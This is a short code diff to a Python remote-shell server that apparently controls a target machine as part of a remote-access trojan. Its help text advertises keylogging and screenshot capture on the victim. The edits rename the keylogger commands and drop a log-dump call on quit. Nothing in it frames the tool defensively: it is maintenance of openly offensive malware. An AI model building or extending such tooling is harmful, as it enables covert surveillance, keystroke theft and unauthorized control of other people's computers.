@@ -4,6 +4,7 @@
 # This script establishes a remote shell connection with a target machine, allowing the execution
 # of various commands and file operations.
 
+
 import socket
 import os
 import json
@@ -134,9 +135,9 @@ class Server:
                         [*] Shell commands:
     
     
-                        • keyscan_start - Start the keylogger.
+                        • keyscan start - Start the keylogger.
     
-                        • keyscan_stop - Stop the keylogger and save the log to a file in the script's directory.
+                        • keyscan stop - Stop the keylogger and save the log to a file in the script's directory.
                         
                         • screenshot - Take a screenshot and save the img in the script's directory.
     
@@ -163,7 +164,6 @@ class Server:
                 self.send_data_as_json(command)
 
                 if command.lower() == 'quit':
-                    self.dump_log_file()
                     self.target_socket.close()
                     exit(0)
 
